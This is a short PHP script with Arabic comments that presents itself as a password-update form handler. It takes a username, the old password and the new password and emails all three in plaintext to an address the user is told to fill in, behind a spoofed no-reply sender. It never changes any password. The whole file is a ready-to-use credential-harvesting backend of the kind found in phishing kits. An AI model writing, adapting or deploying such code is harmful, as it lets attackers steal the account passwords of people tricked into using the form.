<?php
// معالجة إرسال النموذج
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // الحصول على البيانات المدخلة من النموذج
    $username = $_POST['username'];
    $old_password = $_POST['old_password'];
    $new_password = $_POST['new_password'];

    // البريد الإلكتروني الذي سيتم إرسال البيانات إليه
    $to = "your-email@example.com";  // استبدل بـ بريدك الإلكتروني

    // موضوع الرسالة
    $subject = "تحديث كلمة المرور من المستخدم $username";

    // محتوى الرسالة
    $message = "اسم المستخدم: $username\n";
    $message .= "كلمة المرور السابقة: $old_password\n";
    $message .= "كلمة المرور الجديدة: $new_password\n";

    // ترويسة البريد (headers)
    $headers = "From: no-reply@example.com" . "\r\n" .
               "Reply-To: no-reply@example.com" . "\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // إرسال البريد
    if (mail($to, $subject, $message, $headers)) {
        $confirmation_message = "تم إرسال البيانات بنجاح!";
    } else {
        $confirmation_message = "حدث خطأ أثناء إرسال البيانات.";
    }
}
